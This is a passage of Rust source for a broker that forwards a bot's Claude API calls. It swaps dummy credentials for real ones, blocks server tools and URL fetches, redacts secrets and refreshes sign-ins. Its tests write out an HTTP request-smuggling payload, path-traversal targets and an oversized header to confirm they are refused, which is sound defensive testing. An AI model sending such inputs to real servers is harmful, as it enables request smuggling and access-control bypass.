    h.get("x-api-key")
        .or_else(|| h.get(hyper::header::AUTHORIZATION))
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
}

/// The headers sent on to Anthropic: only [`ANTHROPIC_FORWARD`] ones, `anthropic-beta` cut down
/// to [`KNOWN_BETAS`]. Returns the beta values stripped (for the log).
fn anthropic_headers(incoming: &HeaderMap) -> (HeaderMap, Vec<String>) {
    let mut out = HeaderMap::new();
    let mut stripped = Vec::new();
    for (k, v) in incoming.iter() {
        let name = k.as_str();
        if name == "anthropic-beta" {
            let Ok(text) = v.to_str() else {
                stripped.push("<non-ascii>".to_string());
                continue;
            };
            let keep: Vec<&str> = text
                .split(',')
                .map(str::trim)
                .filter(|b| !b.is_empty())
                .filter(|b| {
                    let known = KNOWN_BETAS.contains(b);
                    if !known {
                        stripped.push(b.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_').take(64).collect());
                    }
                    known
                })
                .collect();
            if let Ok(v) = HeaderValue::from_str(&keep.join(",")) {
                if !keep.is_empty() {
                    out.append(k.clone(), v);
                }
            }
        } else if ANTHROPIC_FORWARD.contains(&name) || name.starts_with(ANTHROPIC_FORWARD_PREFIX) {
            out.append(k.clone(), v.clone());
        }
    }
    (out, stripped)
}

/// The container must send the stand-in of the same kind as the real credential: an API key
/// profile gets `x-api-key`, a sign-in gets `Authorization: Bearer`. A mismatch is a 409, never a
/// fall back to the other kind or an unauthenticated forward.
fn check_credential_kind(cred: &Credential, h: &HeaderMap) -> Result<(), Deny> {
    let api_key = h.contains_key("x-api-key");
    let bearer = h
        .get(hyper::header::AUTHORIZATION)
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.len() > 7 && v[..7].eq_ignore_ascii_case("bearer "));
    let ok = match cred {
        Credential::ApiKey(_) => api_key && !h.contains_key(hyper::header::AUTHORIZATION),
        Credential::OAuthFile { .. } => bearer && !api_key,
    };
    if ok {
        Ok(())
    } else {
        Err(Deny::new(
            StatusCode::CONFLICT,
            codes::CREDENTIAL_MISMATCH,
            "The bot's computer sent a different kind of Claude credential than this bot uses",
        ))
    }
}

/// D3: a Messages request may not make Anthropic's servers reach anything: no `mcp_servers`, no
/// `container`, no server tools, and no content fetched by URL or from the Files API.
pub fn check_messages_body(body: &[u8]) -> Result<(), Deny> {
    // Mira's bodies (design/ui.md): the model reads them, so they say what to do next
    let refuse = |message: &'static str| Deny::new(StatusCode::BAD_REQUEST, codes::SERVER_TOOL_NOT_ALLOWED, message);
    // Strict: a key repeated anywhere is refused, since Anthropic and serde could keep
    // different copies (`"tools"` twice, or `"type"` twice in one tool).
    let doc: Value = parse_strict(body)
        .map_err(|_| Deny::new(StatusCode::BAD_REQUEST, codes::BAD_REQUEST, "The request body isn't valid JSON, or repeats a key"))?;
    let Some(top) = doc.as_object() else {
        return Err(Deny::new(StatusCode::BAD_REQUEST, codes::BAD_REQUEST, "The request body isn't a JSON object"));
    };
    if top.contains_key("mcp_servers") {
        return Err(refuse(super::notice::body::MCP_SERVERS));
    }
    if top.contains_key("container") {
        return Err(refuse(super::notice::body::SERVER_TOOL));
    }
    if let Some(tools) = top.get("tools") {
        let Some(tools) = tools.as_array() else {
            return Err(Deny::new(StatusCode::BAD_REQUEST, codes::BAD_REQUEST, "tools must be a list"));
        };
        for t in tools {
            match t.get("type") {
                None | Some(Value::Null) => {}
                Some(Value::String(ty)) if ALLOWED_TOOL_TYPES.contains(&ty.as_str()) => {}
                Some(Value::String(_)) => return Err(refuse(super::notice::body::SERVER_TOOL)),
                Some(_) => return Err(Deny::new(StatusCode::BAD_REQUEST, codes::BAD_REQUEST, "A tool's type must be text")),
            }
        }
    }
    if fetches_by_reference(&doc) {
        return Err(refuse(super::notice::body::FETCH_BY_REFERENCE));
    }
    Ok(())
}

/// Parses JSON, refusing a key repeated within any object, at any depth.
pub fn parse_strict(body: &[u8]) -> Result<Value, String> {
    use serde::de::{Deserialize, Deserializer, Error as _, MapAccess, SeqAccess, Visitor};
    struct Strict(Value);
    impl<'de> Deserialize<'de> for Strict {
        fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
            d.deserialize_any(V).map(Strict)
        }
    }
    struct V;
    impl<'de> Visitor<'de> for V {
        type Value = Value;
        fn expecting(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            f.write_str("JSON")
        }
        fn visit_bool<E>(self, v: bool) -> Result<Value, E> {
            Ok(Value::Bool(v))
        }
        fn visit_i64<E>(self, v: i64) -> Result<Value, E> {
            Ok(v.into())
        }
        fn visit_u64<E>(self, v: u64) -> Result<Value, E> {
            Ok(v.into())
        }
        fn visit_f64<E>(self, v: f64) -> Result<Value, E> {
            Ok(serde_json::Number::from_f64(v).map_or(Value::Null, Value::Number))
        }
        fn visit_str<E>(self, v: &str) -> Result<Value, E> {
            Ok(Value::String(v.into()))
        }
        fn visit_string<E>(self, v: String) -> Result<Value, E> {
            Ok(Value::String(v))
        }
        fn visit_unit<E>(self) -> Result<Value, E> {
            Ok(Value::Null)
        }
        fn visit_none<E>(self) -> Result<Value, E> {
            Ok(Value::Null)
        }
        fn visit_seq<A: SeqAccess<'de>>(self, mut a: A) -> Result<Value, A::Error> {
            let mut out = Vec::new();
            while let Some(Strict(x)) = a.next_element()? {
                out.push(x);
            }
            Ok(Value::Array(out))
        }
        fn visit_map<A: MapAccess<'de>>(self, mut a: A) -> Result<Value, A::Error> {
            let mut out = serde_json::Map::new();
            while let Some(k) = a.next_key::<String>()? {
                if out.contains_key(&k) {
                    return Err(A::Error::custom("repeated key"));
                }
                let Strict(v) = a.next_value()?;
                out.insert(k, v);
            }
            Ok(Value::Object(out))
        }
    }
    let mut de = serde_json::Deserializer::from_slice(body);
    let Strict(v) = Strict::deserialize(&mut de).map_err(|e| e.to_string())?;
    de.end().map_err(|e| e.to_string())?;
    Ok(v)
}

/// Whether any content block has a `source` Anthropic would fetch (`url`, `file`).
fn fetches_by_reference(v: &Value) -> bool {
    match v {
        Value::Object(m) => {
            let by_ref = m
                .get("source")
                .and_then(|s| s.get("type"))
                .and_then(Value::as_str)
                .is_some_and(|t| t != "base64" && t != "text" && t != "content");
            by_ref || m.values().any(fetches_by_reference)
        }
        Value::Array(a) => a.iter().any(fetches_by_reference),
        _ => false,
    }
}

/// reqwest's error text without the URL (it can carry a token in the kwnt route's path).
fn without_url(e: &reqwest::Error) -> String {
    let mut msg = e.to_string();
    if let Some(url) = e.url() {
        msg = msg.replace(url.as_str(), "<url>");
    }
    if e.is_connect() {
        "connection failed".into()
    } else if e.is_timeout() {
        "timed out".into()
    } else {
        msg
    }
}

async fn read_body<B>(body: B) -> Result<Bytes, Deny>
where
    B: hyper::body::Body<Data = Bytes> + Send + 'static,
    B::Error: Into<Box<dyn std::error::Error + Send + Sync>>,
{
    let read = tokio::time::timeout(BODY_TIMEOUT, Limited::new(body, MAX_REQUEST_BYTES).collect()).await;
    let Ok(read) = read else {
        return Err(Deny::new(StatusCode::REQUEST_TIMEOUT, codes::REQUEST_TIMEOUT, "The request body took too long to arrive"));
    };
    match read {
        Ok(c) => Ok(c.to_bytes()),
        Err(e) => {
            let too_large = e.downcast_ref::<http_body_util::LengthLimitError>().is_some();
            Err(if too_large {
                Deny::new(StatusCode::PAYLOAD_TOO_LARGE, codes::REQUEST_TOO_LARGE, "The request is larger than kwnt's broker forwards")
            } else {
                Deny::new(StatusCode::BAD_REQUEST, codes::REQUEST_TOO_LARGE, "The request body couldn't be read")
            })
        }
    }
}

/// Streams the upstream response back. Hop-by-hop headers, cookies and redirects' `Location` are
/// dropped; with `secret` set, any header carrying it is dropped and the body is scrubbed of it,
/// even where it is split across chunks.
fn stream_response(resp: reqwest::Response, secret: Option<Secret>) -> Response<BrokerBody> {
    let mut out = Response::builder().status(resp.status().as_u16());
    let needle = secret.map(|s| s.expose().as_bytes().to_vec()).filter(|n| n.len() >= 8);
    if let Some(h) = out.headers_mut() {
        for (k, v) in resp.headers().iter() {
            if DROP_RESPONSE.contains(&k.as_str()) {
                continue;
            }
            if needle.as_ref().is_some_and(|n| contains(v.as_bytes(), n)) {
                continue;
            }
            h.append(k.clone(), v.clone());
        }
    }
    let upstream = Box::pin(resp.bytes_stream()).map_err(|e| std::io::Error::other(without_url(&e)));
    let body = match needle {
        None => BodyExt::boxed_unsync(StreamBody::new(upstream.map_ok(Frame::data))),
        Some(n) => BodyExt::boxed_unsync(StreamBody::new(scrubbed(upstream, n).map_ok(Frame::data))),
    };
    out.body(body)
        .unwrap_or_else(|_| deny_response(&Deny::new(StatusCode::BAD_GATEWAY, codes::UPSTREAM_UNREACHABLE, "bad upstream response")))
}

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    !needle.is_empty() && hay.windows(needle.len()).any(|w| w == needle)
}

/// Replaces every occurrence of `needle` in a byte stream with `[redacted]`, holding back the
/// last `needle.len() - 1` bytes of each chunk until the next one shows whether they start it.
pub fn scrubbed<S>(stream: S, needle: Vec<u8>) -> impl futures::Stream<Item = Result<Bytes, std::io::Error>>
where
    S: futures::Stream<Item = Result<Bytes, std::io::Error>> + Unpin,
{
    struct St<S> {
        inner: S,
        buf: Vec<u8>,
        needle: Vec<u8>,
        done: bool,
    }
    fn redact(buf: &mut Vec<u8>, needle: &[u8]) {
        let mut out = Vec::with_capacity(buf.len());
        let mut i = 0;
        while i < buf.len() {
            if buf[i..].starts_with(needle) {
                out.extend_from_slice(b"[redacted]");
                i += needle.len();
            } else {
                out.push(buf[i]);
                i += 1;
            }
        }
        *buf = out;
    }
    futures::stream::unfold(St { inner: stream, buf: Vec::new(), needle, done: false }, |mut st| async move {
        use futures::StreamExt;
        loop {
            if st.done {
                return None;
            }
            match st.inner.next().await {
                Some(Ok(chunk)) => {
                    st.buf.extend_from_slice(&chunk);
                    redact(&mut st.buf, &st.needle);
                    // Keep a tail that could be the start of the needle
                    let keep = (st.needle.len() - 1).min(st.buf.len());
                    let mut cut = st.buf.len() - keep;
                    // never cut inside a "[redacted]" we just wrote: it can't start the needle anyway
                    while cut < st.buf.len() && !st.needle.starts_with(&st.buf[cut..]) {
                        cut += 1;
                    }
                    let out: Vec<u8> = st.buf.drain(..cut).collect();
                    if !out.is_empty() {
                        return Some((Ok(Bytes::from(out)), st));
                    }
                }
                Some(Err(e)) => {
                    st.done = true;
                    return Some((Err(e), st));
                }
                None => {
                    st.done = true;
                    let rest = std::mem::take(&mut st.buf);
                    if rest.is_empty() {
                        return None;
                    }
                    return Some((Ok(Bytes::from(rest)), st));
                }
            }
        }
    })
}

/// An error shaped like Anthropic's own, so the CLI shows the message as it is. `x-should-retry:
/// false` keeps the Anthropic SDK from retrying a refusal.
pub fn deny_response(d: &Deny) -> Response<BrokerBody> {
    let body = json!({
        "type": "error",
        "error": {"type": "kwnt_broker", "code": d.code, "message": d.message},
    });
    Response::builder()
        .status(d.status)
        .header("content-type", "application/json")
        .header("x-should-retry", "false")
        .body(BodyExt::boxed_unsync(Full::new(Bytes::from(body.to_string())).map_err(|never: Infallible| match never {})))
        .expect("static response")
}

/// A request a test sends straight into [`Broker::handle`].
pub fn test_request(method: Method, path: &str, headers: &[(&str, &str)], body: &str) -> Request<Full<Bytes>> {
    let mut b = Request::builder().method(method).uri(path);
    for (k, v) in headers {
        b = b.header(*k, *v);
    }
    b.body(Full::new(Bytes::from(body.to_string()))).expect("test request")
}

/// Hyper's incoming body type, for callers that name it.
pub type IncomingBody = Incoming;

#[cfg(test)]
mod tests {
    use super::*;
    use axum::{routing::post, Router};
    use std::sync::atomic::AtomicUsize;

    #[derive(Clone, Default)]
    struct Seen {
        auth: Arc<StdMutex<Vec<String>>>,
        refreshes: Arc<AtomicUsize>,
        fail_first_with_401: Arc<StdMutex<bool>>,
    }

    /// A fake Anthropic: echoes the credential it got; `/oauth` refreshes.
    async fn fake_upstream(seen: Seen) -> String {
        let s1 = seen.clone();
        let s2 = seen.clone();
        let app = Router::new()
            .route(
                "/v1/messages",
                post(move |headers: axum::http::HeaderMap| {
                    let seen = s1.clone();
                    async move {
                        let cred = headers
                            .get("x-api-key")
                            .or_else(|| headers.get("authorization"))
                            .and_then(|v| v.to_str().ok())
                            .unwrap_or("")
                            .to_string();
                        seen.auth.lock().unwrap().push(cred.clone());
                        let mut first = seen.fail_first_with_401.lock().unwrap();
                        if *first {
                            *first = false;
                            return (axum::http::StatusCode::UNAUTHORIZED, "expired".to_string());
                        }
                        (axum::http::StatusCode::OK, format!("{{\"ok\":true,\"len\":{}}}", cred.len()))
                    }
                }),
            )
            .route(
                "/oauth",
                post(move |body: axum::Json<Value>| {
                    let seen = s2.clone();
                    async move {
                        seen.refreshes.fetch_add(1, Ordering::SeqCst);
                        assert_eq!(body["grant_type"], "refresh_token");
                        assert_eq!(body["client_id"], OAUTH_CLIENT_ID);
                        axum::Json(json!({"access_token": "sk-ant-oat01-NEW", "refresh_token": "sk-ant-ort01-NEW", "expires_in": 3600}))
                    }
                }),
            );
        let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = l.local_addr().unwrap();
        tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
        format!("http://{addr}")
    }

    fn broker(origin: &str, dir: &Path) -> Arc<Broker> {
        Broker::new(BrokerConfig {
            anthropic_origin: origin.into(),
            oauth_token_url: format!("{origin}/oauth"),
            log_path: dir.join("broker.log"),
        })
    }

    async fn body_text(r: Response<BrokerBody>) -> String {
        String::from_utf8(r.into_body().collect().await.unwrap().to_bytes().to_vec()).unwrap()
    }

    /// The stand-in headers the CLI in the container sends, by credential kind.
    const KEY: &[(&str, &str)] = &[("x-api-key", "sk-ant-api03-kwnt-dummy")];
    const BEARER: &[(&str, &str)] = &[("authorization", "Bearer sk-ant-oat01-kwnt-dummy")];

    fn spec(bot: &str, credential: Credential) -> TurnSpec {
        TurnSpec { bot: bot.into(), credential, kwnt_origin: None, cap: 3 }
    }

    #[tokio::test]
    async fn swaps_the_dummy_for_the_real_key_and_logs_no_secret() {
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let lease = b.register(spec("bot-a", Credential::ApiKey(Secret::new("sk-ant-api03-REAL"))));
        let path = format!("/t/{}/anthropic/v1/messages?beta=true", lease.key());
        let r = b.handle("bot-a", test_request(Method::POST, &path, &[("x-api-key", "sk-ant-api03-kwnt-dummy")], "{}")).await;
        assert_eq!(r.status(), StatusCode::OK);
        assert_eq!(*seen.auth.lock().unwrap(), vec!["sk-ant-api03-REAL".to_string()]);
        let log = std::fs::read_to_string(dir.path().join("broker.log")).unwrap();
        assert!(!log.contains("sk-ant-api03-REAL") && !log.contains(lease.key()), "{log}");
        assert!(log.contains("\"decision\":\"forward\""), "{log}");
        assert!(format!("{:?}", Secret::new("sk-ant-api03-REAL")).starts_with("Secret(sha8="));
    }

    #[tokio::test]
    async fn refuses_other_paths_routes_bots_and_ended_turns() {
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let lease = b.register(spec("bot-a", Credential::ApiKey(Secret::new("sk-ant-api03-REAL"))));
        let k = lease.key().to_string();
        let cases = [
            ("bot-a", Method::POST, format!("/t/{k}/anthropic/v1/oauth/token"), codes::PATH_NOT_ALLOWED),
            ("bot-a", Method::GET, format!("/t/{k}/anthropic/v1/messages"), codes::PATH_NOT_ALLOWED),
            ("bot-a", Method::POST, format!("/t/{k}/anthropic/v1/messages?x=1"), codes::PATH_NOT_ALLOWED),
            ("bot-a", Method::POST, format!("/t/{k}/anthropic/v1/files"), codes::PATH_NOT_ALLOWED),
            ("bot-a", Method::POST, format!("/t/{k}/openai/v1/responses"), codes::ROUTE_NOT_ALLOWED),
            ("bot-a", Method::POST, format!("/t/{k}/kwnt/api/mcp/self"), codes::PATH_NOT_ALLOWED),
            ("bot-a", Method::POST, "/anthropic/v1/messages".to_string(), codes::ROUTE_NOT_ALLOWED),
            ("bot-b", Method::POST, format!("/t/{k}/anthropic/v1/messages"), codes::UNKNOWN_TURN),
            ("bot-a", Method::POST, "/t/nope/anthropic/v1/messages".to_string(), codes::UNKNOWN_TURN),
        ];
        for (bot, m, p, code) in cases {
            let r = b.handle(bot, test_request(m.clone(), &p, &[], "{}")).await;
            assert_eq!(r.status(), StatusCode::FORBIDDEN, "{m} {p}");
            assert_eq!(r.headers()["x-should-retry"], "false");
            let text = body_text(r).await;
            assert!(text.contains(code), "{m} {p}: {text}");
            assert!(!text.contains("REAL"));
        }
        drop(lease);
        let r = b.handle("bot-a", test_request(Method::POST, &format!("/t/{k}/anthropic/v1/messages"), &[], "{}")).await;
        assert!(body_text(r).await.contains(codes::UNKNOWN_TURN));
        assert!(seen.auth.lock().unwrap().is_empty(), "nothing refused reached the upstream");
    }

    #[tokio::test]
    async fn caps_model_calls_per_turn_with_a_no_retry_429() {
        let dir = tempfile::tempdir().unwrap();
        let b = broker(&fake_upstream(Seen::default()).await, dir.path());
        let lease = b.register(spec("bot-a", Credential::ApiKey(Secret::new("k"))));
        let p = format!("/t/{}/anthropic/v1/messages", lease.key());
        for _ in 0..3 {
            assert_eq!(b.handle("bot-a", test_request(Method::POST, &p, KEY, "{}")).await.status(), StatusCode::OK);
        }
        let r = b.handle("bot-a", test_request(Method::POST, &p, KEY, "{}")).await;
        assert_eq!(r.status(), StatusCode::TOO_MANY_REQUESTS);
        assert_eq!(r.headers()["x-should-retry"], "false");
        assert!(body_text(r).await.contains(codes::REQUEST_CAP));
        // a new turn starts from zero
        let next = b.register(spec("bot-a", Credential::ApiKey(Secret::new("k"))));
        let p2 = format!("/t/{}/anthropic/v1/messages", next.key());
        assert_eq!(b.handle("bot-a", test_request(Method::POST, &p2, KEY, "{}")).await.status(), StatusCode::OK);
    }

    #[tokio::test]
    async fn parallel_requests_never_pass_the_cap() {
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let lease = b.register(spec("bot-a", Credential::ApiKey(Secret::new("k"))));
        let p = format!("/t/{}/anthropic/v1/messages", lease.key());
        let calls = (0..20).map(|_| {
            let (b, p) = (b.clone(), p.clone());
            tokio::spawn(async move { b.handle("bot-a", test_request(Method::POST, &p, KEY, "{}")).await.status() })
        });
        let mut ok = 0;
        for c in calls {
            match c.await.unwrap() {
                StatusCode::OK => ok += 1,
                s => assert_eq!(s, StatusCode::TOO_MANY_REQUESTS),
            }
        }
        assert_eq!(ok, 3);
        assert_eq!(seen.auth.lock().unwrap().len(), 3, "the upstream saw exactly the cap");
        assert!(lease.cap_reached());
    }

    fn write_signin(path: &Path, access: &str, expires_at: i64) {
        std::fs::write(
            path,
            json!({"claudeAiOauth": {"accessToken": access, "refreshToken": "sk-ant-ort01-OLD", "expiresAt": expires_at, "scopes": ["user:inference"], "subscriptionType": "max"}, "other": 1}).to_string(),
        )
        .unwrap();
    }

    #[tokio::test]
    async fn owns_refresh_for_a_profile_sign_in_single_flight_keeping_other_fields() {
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let creds = dir.path().join(".credentials.json");
        write_signin(&creds, "sk-ant-oat01-OLD", now_ms() + 10_000); // inside the margin
        let lease = b.register(spec("bot-a", Credential::OAuthFile { path: creds.clone(), refresh: true }));
        let p = format!("/t/{}/anthropic/v1/messages", lease.key());
        let (r1, r2) = tokio::join!(
            b.handle("bot-a", test_request(Method::POST, &p, &[("authorization", "Bearer dummy")], "{}")),
            b.handle("bot-a", test_request(Method::POST, &p, &[("authorization", "Bearer dummy")], "{}")),
        );
        assert_eq!((r1.status(), r2.status()), (StatusCode::OK, StatusCode::OK));
        assert_eq!(seen.refreshes.load(Ordering::SeqCst), 1, "two calls, one refresh");
        assert!(seen.auth.lock().unwrap().iter().all(|a| a == "Bearer sk-ant-oat01-NEW"));
        let doc: Value = serde_json::from_str(&std::fs::read_to_string(&creds).unwrap()).unwrap();
        assert_eq!(doc["claudeAiOauth"]["refreshToken"], "sk-ant-ort01-NEW");
        assert_eq!(doc["claudeAiOauth"]["subscriptionType"], "max");
        assert_eq!(doc["other"], 1);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(std::fs::metadata(&creds).unwrap().permissions().mode() & 0o777, 0o600);
        }
    }

    #[tokio::test]
    async fn refreshes_once_on_a_401_then_retries() {
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        *seen.fail_first_with_401.lock().unwrap() = true;
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let creds = dir.path().join(".credentials.json");
        write_signin(&creds, "sk-ant-oat01-OLD", now_ms() + 3_600_000);
        let lease = b.register(spec("bot-a", Credential::OAuthFile { path: creds.clone(), refresh: true }));
        let r = b.handle("bot-a", test_request(Method::POST, &format!("/t/{}/anthropic/v1/messages", lease.key()), BEARER, "{}")).await;
        assert_eq!(r.status(), StatusCode::OK);
        assert_eq!(*seen.auth.lock().unwrap(), vec!["Bearer sk-ant-oat01-OLD".to_string(), "Bearer sk-ant-oat01-NEW".to_string()]);
        assert_eq!(seen.refreshes.load(Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn never_refreshes_the_hosts_own_sign_in() {
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let creds = dir.path().join(".credentials.json");
        write_signin(&creds, "sk-ant-oat01-OLD", now_ms() - 1);
        let before = std::fs::read(&creds).unwrap();
        let lease = b.register(spec("bot-a", Credential::OAuthFile { path: creds.clone(), refresh: false }));
        let r = b.handle("bot-a", test_request(Method::POST, &format!("/t/{}/anthropic/v1/messages", lease.key()), BEARER, "{}")).await;
        assert_eq!(r.status(), StatusCode::SERVICE_UNAVAILABLE);
        assert!(body_text(r).await.contains(codes::SIGN_IN_EXPIRED));
        assert_eq!(seen.refreshes.load(Ordering::SeqCst), 0);
        assert!(seen.auth.lock().unwrap().is_empty());
        assert_eq!(std::fs::read(&creds).unwrap(), before, "the host's file is untouched");
    }

    #[tokio::test]
    async fn the_kwnt_route_passes_only_listed_paths_with_their_own_token() {
        let dir = tempfile::tempdir().unwrap();
        let got = Arc::new(StdMutex::new(Vec::<String>::new()));
        let g = got.clone();
        let app = Router::new().route(
            "/api/mcp/permission/:tok",
            post(move |axum::extract::Path(tok): axum::extract::Path<String>, headers: axum::http::HeaderMap| {
                let g = g.clone();
                async move {
                    g.lock().unwrap().push(format!("{tok} {}", headers.get("authorization").and_then(|v| v.to_str().ok()).unwrap_or("-")));
                    "ok"
                }
            }),
        );
        let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let origin = format!("http://{}", l.local_addr().unwrap());
        tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
        let b = broker("http://127.0.0.1:1", dir.path());
        let lease = b.register(TurnSpec { kwnt_origin: Some(origin), ..spec("bot-a", Credential::ApiKey(Secret::new("k"))) });
        let tok = "0123456789abcdef0123456789abcdef";
        assert!(lease.allow_kwnt_path(&format!("/api/mcp/permission/{tok}")));
        assert!(!lease.allow_kwnt_path("/api/settings/computer"), "only kwnt's MCP endpoints");
        assert!(!lease.allow_kwnt_path("/api/mcp/permission/../servers"));
        let ok = b.handle("bot-a", test_request(Method::POST, &format!("/t/{}/kwnt/api/mcp/permission/{tok}", lease.key()), &[("authorization", "Bearer gw")], "{}")).await;
        assert_eq!(ok.status(), StatusCode::OK);
        let other = b.handle("bot-a", test_request(Method::POST, &format!("/t/{}/kwnt/api/mcp/permission/tok2", lease.key()), &[], "{}")).await;
        assert_eq!(other.status(), StatusCode::FORBIDDEN);
        assert_eq!(*got.lock().unwrap(), vec![format!("{tok} Bearer gw")]);
        let log = std::fs::read_to_string(dir.path().join("broker.log")).unwrap();
        assert!(!log.contains(tok) && !log.contains("Bearer gw"), "tokens are hashed in the log: {log}");
    }

    #[tokio::test]
    async fn refuses_rather_than_normalizes_odd_targets() {
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let lease = b.register(spec("bot-a", Credential::ApiKey(Secret::new("k"))));
        let k = lease.key().to_string();
        let targets = [
            format!("/t/{k}/anthropic/v1/x/../messages"),
            format!("/t/{k}/anthropic/v1/./messages"),
            format!("/t/{k}/anthropic/v1/%2e%2e/v1/messages"),
            format!("/t/{k}/anthropic/v1/messages%2Fcount_tokens"),
            format!("/t/{k}/anthropic//v1/messages"),
            format!("/t/{k}//anthropic/v1/messages"),
            format!("/t/{k}/anthropic/v1/messages/"),
            format!("http://api.anthropic.com/t/{k}/anthropic/v1/messages"),
        ];
        for t in &targets {
            let r = b.handle("bot-a", test_request(Method::POST, t, &[], "{}")).await;
            assert_eq!(r.status(), StatusCode::BAD_REQUEST, "{t}");
            assert!(body_text(r).await.contains(codes::BAD_REQUEST), "{t}");
        }
        let p = format!("/t/{k}/anthropic/v1/messages");
        let both = b.handle("bot-a", test_request(Method::POST, &p, &[("content-length", "2"), ("transfer-encoding", "chunked")], "{}")).await;
        assert_eq!(both.status(), StatusCode::BAD_REQUEST);
        let two = b.handle("bot-a", test_request(Method::POST, &p, &[("content-length", "2"), ("content-length", "2")], "{}")).await;
        assert_eq!(two.status(), StatusCode::BAD_REQUEST);
        let connect = b.handle("bot-a", test_request(Method::CONNECT, &p, &[], "")).await;
        assert_eq!(connect.status(), StatusCode::BAD_REQUEST);
        assert_eq!(lease.requests(), 0, "nothing refused counted against the cap");
        assert!(seen.auth.lock().unwrap().is_empty(), "nothing refused reached the upstream");
    }

    /// Raw bytes on the socket: what hyper itself refuses before the broker sees a request.
    #[cfg(unix)]
    #[tokio::test]
    async fn the_socket_refuses_smuggling_and_oversized_heads() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let lease = b.register(spec("bot-a", Credential::ApiKey(Secret::new("k"))));
        let sock = dir.path().join("run/broker.sock");
        b.listen("bot-a", &sock).await.unwrap();
        let k = lease.key().to_string();
        let send = |raw: Vec<u8>| {
            let sock = sock.clone();
            async move {
                let mut s = tokio::net::UnixStream::connect(&sock).await.unwrap();
                let _ = s.write_all(&raw).await;
                let mut out = Vec::new();
                let _ = tokio::time::timeout(Duration::from_secs(5), s.read_to_end(&mut out)).await;
                String::from_utf8_lossy(&out).into_owned()
            }
        };
        // CL + TE: refused, and the smuggled second request never runs
        let smuggle = format!(
            "POST /t/{k}/anthropic/v1/messages HTTP/1.1\r\nhost: x\r\ncontent-length: 4\r\ntransfer-encoding: chunked\r\n\r\n0\r\n\r\nPOST /t/{k}/anthropic/v1/messages HTTP/1.1\r\nhost: x\r\ncontent-length: 0\r\n\r\n"
        );
        let out = send(smuggle.into_bytes()).await;
        assert!(out.starts_with("HTTP/1.1 400"), "{out}");
        assert!(!out.contains("HTTP/1.1 200"), "{out}");
        // a 100 KB header
        let big = format!("POST /t/{k}/anthropic/v1/messages HTTP/1.1\r\nhost: x\r\nx-big: {}\r\ncontent-length: 0\r\n\r\n", "a".repeat(100 << 10));
        let out = send(big.into_bytes()).await;
        assert!(out.is_empty() || out.starts_with("HTTP/1.1 431") || out.starts_with("HTTP/1.1 400"), "{}", &out[..out.len().min(200)]);
        // absolute-form and authority-form request lines
        let abs = format!("POST http://api.anthropic.com/t/{k}/anthropic/v1/messages HTTP/1.1\r\nhost: x\r\ncontent-length: 0\r\nconnection: close\r\n\r\n");
        assert!(send(abs.into_bytes()).await.starts_with("HTTP/1.1 400"));
        let conn = "CONNECT api.anthropic.com:443 HTTP/1.1\r\nhost: api.anthropic.com:443\r\n\r\n".to_string();
        let out = send(conn.into_bytes()).await;
        assert!(!out.starts_with("HTTP/1.1 200"), "{out}");
        assert!(seen.auth.lock().unwrap().is_empty(), "nothing reached the upstream");
        b.close_all().await;
    }

    fn rss_kb() -> u64 {
        std::fs::read_to_string("/proc/self/status")
            .ok()
            .and_then(|s| s.lines().find(|l| l.starts_with("VmRSS:")).and_then(|l| l.split_whitespace().nth(1)?.parse().ok()))
            .unwrap_or(0)
    }

    /// Test plan #6 (B-20 … B-22c): a huge body, a slow head and a connection flood each cost the
    /// sender only; the broker's memory stays bounded and the next client is served.
    #[cfg(target_os = "linux")]
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn limits_cost_the_sender_only_and_the_next_client_is_served() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let dir = tempfile::tempdir().unwrap();
        let seen = Seen::default();
        let b = broker(&fake_upstream(seen.clone()).await, dir.path());
        let lease = b.register(TurnSpec { cap: 1000, ..spec("bot-a", Credential::ApiKey(Secret::new("sk-ant-api03-REAL"))) });
        let sock = dir.path().join("run/broker.sock");
        b.listen("bot-a", &sock).await.unwrap();
        let k = lease.key().to_string();
        let good = format!("POST /t/{k}/anthropic/v1/messages HTTP/1.1\r\nhost: x\r\nx-api-key: {DUMMY}\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{{}}", DUMMY = super::super::DUMMY_API_KEY);
        let ask = |raw: String| {
            let sock = sock.clone();
            async move {
                let mut s = tokio::net::UnixStream::connect(&sock).await.unwrap();
                let _ = s.write_all(raw.as_bytes()).await;
                let mut out = Vec::new();
                let _ = tokio::time::timeout(Duration::from_secs(20), s.read_to_end(&mut out)).await;
                String::from_utf8_lossy(&out).into_owned()
            }
        };
        let base = rss_kb();
        assert!(ask(good.clone()).await.starts_with("HTTP/1.1 200"), "a plain call is served");

        // B-20: a 40 MB body is refused from its Content-Length, before any of it arrives
        let t = std::time::Instant::now();
